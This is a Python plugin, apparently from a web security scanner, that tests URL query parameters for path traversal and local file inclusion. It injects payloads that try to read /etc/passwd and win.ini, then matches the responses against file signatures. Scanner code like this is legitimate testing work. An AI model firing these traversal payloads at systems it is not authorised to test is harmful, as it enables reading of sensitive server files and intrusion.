# vibee_hacker/plugins/blackbox/path_traversal.py
"""Path traversal / LFI detection plugin."""

from __future__ import annotations

import re
import shlex
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

import httpx

from vibee_hacker.core.models import Target, Result, Severity, InterPhaseContext
from vibee_hacker.core.plugin_base import PluginBase

TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
]

FILE_SIGNATURES = [
    re.compile(r"root:.*:0:0:", re.I),          # /etc/passwd
    re.compile(r"\[extensions\]", re.I),          # win.ini
    re.compile(r"\[fonts\]", re.I),               # win.ini
]

MAX_PARAMS = 10


class PathTraversalPlugin(PluginBase):
    name = "path_traversal"
    description = "Path traversal / Local File Inclusion detection"
    category = "blackbox"
    phase = 3
    base_severity = Severity.CRITICAL
    detection_criteria = "Known file content signatures in response after path traversal payload"
    expected_evidence = "root:x:0:0: or [extensions] patterns in response"

    async def run(self, target: Target, context: InterPhaseContext | None = None) -> list[Result]:
        if not target.url:
            return []

        # Build list of URLs to test: start URL + crawled URLs that have query params
        urls_to_test: list[str] = [target.url]
        if context:
            for crawled_url in (context.crawl_urls or [])[:10]:
                if crawled_url != target.url and "?" in crawled_url:
                    urls_to_test.append(crawled_url)

        results: list[Result] = []
        async with httpx.AsyncClient(verify=target.verify_ssl, timeout=10) as client:
            for test_target_url in urls_to_test:
                parsed = urlparse(test_target_url)
                params = parse_qs(parsed.query)
                if not params:
                    continue

                capped_params = dict(list(params.items())[:MAX_PARAMS])

                # Fetch baseline response
                try:
                    baseline_resp = await client.get(test_target_url)
                except (httpx.TransportError, httpx.InvalidURL, httpx.DecodingError):
                    continue

                # Determine which signatures already match in baseline — skip those later
                baseline_matched_sigs = {sig for sig in FILE_SIGNATURES if sig.search(baseline_resp.text)}

                for param_name in capped_params:
                    for payload in TRAVERSAL_PAYLOADS:
                        test_params = {k: v[0] for k, v in capped_params.items()}
                        test_params[param_name] = payload
                        test_url = urlunparse(parsed._replace(query=urlencode(test_params)))

                        try:
                            resp = await client.get(test_url)
                        except (httpx.TransportError, httpx.InvalidURL, httpx.DecodingError):
                            continue

                        if len(resp.text) > 1_000_000:  # 1MB max response
                            continue

                        for sig in FILE_SIGNATURES:
                            if sig in baseline_matched_sigs:
                                continue
                            if sig.search(resp.text):
                                results.append(Result(
                                    plugin_name=self.name,
                                    base_severity=self.base_severity,
                                    title=f"Path Traversal in parameter '{param_name}'",
                                    description=f"LFI detected with payload: {payload}",
                                    evidence=sig.pattern,
                                    cwe_id="CWE-22",
                                    endpoint=test_target_url,
                                    param_name=param_name,
                                    curl_command=f"curl {shlex.quote(test_url)}",
                                    rule_id="path_traversal_lfi",
                                ))
                                return results

        return results
